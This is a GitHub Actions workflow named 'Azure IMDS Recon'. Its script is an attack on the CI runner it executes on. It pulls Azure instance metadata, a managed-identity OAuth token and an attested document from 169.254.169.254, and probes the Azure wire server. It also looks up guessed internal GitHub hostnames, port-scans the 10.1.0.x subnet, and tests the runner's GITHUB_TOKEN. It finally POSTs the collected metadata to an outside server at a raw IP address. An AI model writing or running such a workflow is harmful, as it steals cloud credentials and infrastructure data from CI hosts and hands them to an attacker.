name: Azure IMDS Recon
on:
  workflow_dispatch:
jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Azure IMDS
        run: |
          set +e
          echo "=== AZURE IMDS ==="
          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1
          echo ""
          echo "=== AZURE IDENTITY TOKEN ==="
          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1
          echo ""
          echo "=== AZURE ATTESTED ==="
          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01" 2>&1
          echo ""
          echo "=== AZURE SCHEDULEDEVENTS ==="
          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1
          echo ""
          echo "=== AZURE WIRE SERVER ==="
          curl -s --connect-timeout 5 "http://168.63.129.16/" 2>&1 | head -20
          echo ""
          curl -s --connect-timeout 5 "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -30
          echo ""
          curl -s --connect-timeout 5 "http://168.63.129.16/machine/?comp=goalstate" -H "x-ms-version: 2012-11-30" 2>&1 | head -30
          echo ""
          echo "=== AZURE WIRE SERVER HEALTH ==="
          curl -s --connect-timeout 5 "http://168.63.129.16/machine/health" 2>&1 | head -10
          echo ""
          echo "=== INTERNAL DNS ==="
          nslookup github.com 2>&1 | head -5
          nslookup api.github.com 2>&1 | head -5
          nslookup internal.github.com 2>&1 | head -5
          nslookup github.net 2>&1 | head -5
          nslookup production.github.com 2>&1 | head -5
          echo ""
          echo "=== INTERNAL HTTP ==="
          curl -s --connect-timeout 3 http://10.1.0.1/ 2>&1 | head -5
          curl -s --connect-timeout 3 http://10.1.0.1:8080/ 2>&1 | head -5
          curl -s --connect-timeout 3 http://10.1.0.1:443/ 2>&1 | head -5
          echo ""
          echo "=== SUBNET SCAN 10.1.0.x ==="
          for i in 1 2 3 4 5 10 20 50 100 200 254; do
            timeout 1 bash -c "echo >/dev/tcp/10.1.0.$i/80" 2>/dev/null && echo "10.1.0.$i:80 OPEN"
            timeout 1 bash -c "echo >/dev/tcp/10.1.0.$i/443" 2>/dev/null && echo "10.1.0.$i:443 OPEN"
            timeout 1 bash -c "echo >/dev/tcp/10.1.0.$i/8080" 2>/dev/null && echo "10.1.0.$i:8080 OPEN"
          done
          echo ""
          echo "=== GITHUB_TOKEN TEST ==="
          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user 2>&1 | head -10
          echo ""
          echo "=== SEND DATA TO OUR SERVER ==="
          AZURE_DATA=$(curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1)
          curl -s --connect-timeout 5 -X POST http://185.244.173.24:8888/azure-imds -d "$AZURE_DATA" 2>&1 || echo "Send fail"
          echo ""
          echo "=== DONE ==="
